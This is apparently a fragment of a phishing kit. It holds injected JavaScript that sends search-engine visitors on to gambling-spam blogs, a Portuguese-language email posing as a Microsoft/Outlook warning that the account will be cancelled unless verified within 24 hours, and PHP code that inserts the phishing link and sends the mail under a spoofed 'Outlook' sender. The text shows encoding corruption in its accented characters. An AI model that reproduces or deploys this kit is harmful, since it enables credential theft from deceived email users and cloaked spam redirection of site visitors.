...
location.href="http://neimenggushishicai.tumblr.com ";
</script>
...
var ua=navigator.userAgent;
if(s.indexOf("google")>0 || s.indexOf("baidu")>0 || s.indexOf("yahoo")>0||ua.indexOf("Baidu")>0||ua.indexOf("baidu")>0 ) 
location.href="http://shishicaipingtaipingce.blog.com ";
</script>
...
$message = stripslashes('<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
                    ...
                    <table align="left" width="100%" border="0" cellpadding="0" cellspacing="0" class="mcnImageContentContainer" style="border-collapse: collapse;mso-table-lspace: 0pt;mso-table-rspace: 0pt;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%;">
                        <tbody><tr>
                            <td class="mcnImageContent" valign="top" style="padding-right: 9px;padding-left: 9px;padding-top: 0;padding-bottom: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%;">
                                        ...
                                        <img align="left" alt="" src="https://sc.imp.live.com/content/dam/imp/surfaces/mail_signin/header/logo_mail.png" width="192" style="max-width: 192px;padding-bottom: 0;display: inline !important;vertical-align: bottom;border: 0;outline: none;text-decoration: none;-ms-interpolation-mode: bicubic;" class="mcnImage">
                ...
                <table align="left" border="0" cellpadding="0" cellspacing="0" width="600" class="mcnTextContentContainer" style="border-collapse: collapse;mso-table-lspace: 0pt;mso-table-rspace: 0pt;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%;">
                    <tbody><tr>
                        ...
                        <td valign="top" class="mcnTextContent" style="padding-top: 9px;padding-right: 18px;padding-bottom: 9px;padding-left: 18px;mso-table-lspace: 0pt;mso-table-rspace: 0pt;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%;color: #606060;font-family: Helvetica;font-size: 15px;line-height: 150%;text-align: left;">
                            ...
                            <h1 class="null" style="margin: 0;padding: 0;display: block;font-family: Helvetica;font-size: 40px;font-style: normal;font-weight: bold;line-height: 125%;letter-spacing: -1px;text-align: left;color: #606060 !important;"><strong>Sua conta ser� cancelada!</strong></h1>

                            <h4 class="null" style="margin: 0;padding: 0;display: block;font-family: Helvetica;font-size: 16px;font-style: normal;font-weight: bold;line-height: 125%;letter-spacing: normal;text-align: left;color: #808080 !important;"><strong>Voc� precisar� verificar seu&nbsp;e-mail&nbsp;em at� 24horas.</strong></h4>
                            <br>
Prezado(a) <b>Cliente Microsoft</b><br>
<br>
Este e-mail ser� bloqueado.<br>
<br>
Para continuar utilizando seu e-mail, ser� necess�rio&nbsp;efetuar uma verifica��o em sua conta.<br>
<br>
Essa verifica��o � r�pida e obrigat�ria.<br>
<br>
Voc� deve efetua-la em no m�ximo em 24horas.<br>
<br>
Clique <a href="%codigo%" target="_blank" style="word-wrap: break-word;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%;color: #6DC6DD;font-weight: normal;text-decoration: underline;">aqui</a> e confirme sua conta.
                        </td>
                    </tr>
                </tbody></table>
...
$assunto = '=?iso-8859-1?Q?Aten=E7=E3o_voc=EA_tem_um_informe_outlook?=';
$sujeito=$_POST["03"];
$emailList=$_POST["04"];

$headers = "From: Outlook <$sujeito>\r\n";
...
$xxxx = $essaurl;
$message2=str_replace("%codigo%", $xxxx, $message);

if (mail($sujeito, $assunto, $message2, $headers)) {
     $sent = "xxx"."sent!";
     } else {
      $sent = ("Error send"."ing email.");
     }
